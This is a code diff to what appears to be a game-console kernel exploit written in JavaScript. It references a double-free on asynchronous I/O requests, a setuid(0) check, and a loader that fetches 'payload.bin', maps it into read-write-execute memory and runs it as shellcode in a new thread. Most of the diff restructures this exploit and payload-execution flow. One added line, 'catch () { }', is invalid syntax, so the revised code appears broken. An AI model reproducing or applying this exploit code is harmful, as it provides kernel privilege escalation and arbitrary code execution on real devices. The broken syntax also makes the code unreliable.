@@ -139,12 +139,12 @@ const leak_len = 16;
 const num_leaks = 5;
 const num_clobbers = 8;
 
+let chain = null;
+var nogc = [];
+
 const PROT_READ = 1;
 const PROT_WRITE = 2;
 const PROT_EXEC = 4;
-
-let chain = null;
-var nogc = [];
 
 async function init() {
     await rop.init();
@@ -1147,7 +1147,7 @@ function double_free_reqs1(
         states[1] = -1;
         poll_aio(target_ids, states);
         log(`target states: ${hex(states[0])}, ${hex(states[1])}`);
-       
+
         const SCE_KERNEL_ERROR_ESRCH = 0x80020003;
         let success = true;
         if (states[0] !== SCE_KERNEL_ERROR_ESRCH) {
@@ -1698,15 +1698,14 @@ export async function kexploit() {
     const _init_t1 = performance.now();
     await init();
     const _init_t2 = performance.now();
-    let shouldLoadPayload = true;
 
-try {
-    if (sysi("setuid", 0) == 0) {
-        runBinLoader();
-        shouldLoadPayload = false;
-    }
-  } catch {  }
-
+     try {
+         if (sysi("setuid", 0) == 0) {
+             runBinLoader();
+             return new Promise(() => {});  
+          }
+        }
+    catch () { }
     
     // fun fact:
     // if the first thing you do since boot is run the web browser, WebKit can
@@ -1809,24 +1808,25 @@ function array_from_address(addr, size) {
     return og_array;
 }
 
-    kexploit().then((shouldLoadPayload) => {
-	    if (shouldLoadPayload) {
-		    fetch('./payload.bin').then(res => res.arrayBuffer()).then(arr => {
-			    const originalLength = arr.byteLength;
-			    const paddingLength = (4 - (originalLength % 4)) % 4;
-			const paddedBuffer = new Uint8Array(originalLength + paddingLength);
-			paddedBuffer.set(new Uint8Array(arr), 0);
-            if (paddingLength) paddedBuffer.set(new Uint8Array(paddingLength), originalLength);
-			const shellcode = new Uint32Array(paddedBuffer.buffer);
-			const payload_buffer = chain.sysp('mmap', 0, paddedBuffer.length, PROT_READ | PROT_WRITE | PROT_EXEC, 0x41000, -1, 0);
-			const native_view = array_from_address(payload_buffer, shellcode.length);
-			native_view.set(shellcode);
-			chain.sys('mprotect', payload_buffer, paddedBuffer.length, PROT_READ | PROT_WRITE | PROT_EXEC);
-			const ctx = new Buffer(0x10);
-			const pthread = new Pointer();
-			pthread.ctx = ctx;
-			call_nze('pthread_create', pthread.addr, 0, payload_buffer, 0);
-	    });
-	}
+kexploit().then(() => {
 
-    })
+fetch('./payload.bin').then(res => res.arrayBuffer()).then(arr => {
+   
+    const originalLength = arr.byteLength;
+    const paddingLength = (4 - (originalLength % 4)) % 4;
+    const paddedBuffer = new Uint8Array(originalLength + paddingLength);
+    paddedBuffer.set(new Uint8Array(arr), 0);
+    if (paddingLength) paddedBuffer.set(new Uint8Array(paddingLength), originalLength);
+    const shellcode = new Uint32Array(paddedBuffer.buffer);
+    const payload_buffer = chain.sysp('mmap', 0, paddedBuffer.length, PROT_READ | PROT_WRITE | PROT_EXEC, 0x41000, -1, 0);
+    const native_view = array_from_address(payload_buffer, shellcode.length);
+    native_view.set(shellcode);
+    chain.sys('mprotect', payload_buffer, paddedBuffer.length, PROT_READ | PROT_WRITE | PROT_EXEC);
+    const ctx = new Buffer(0x10);
+    const pthread = new Pointer();
+    pthread.ctx = ctx;
+
+    call_nze('pthread_create', pthread.addr, 0, payload_buffer, 0);
+});
+
+})
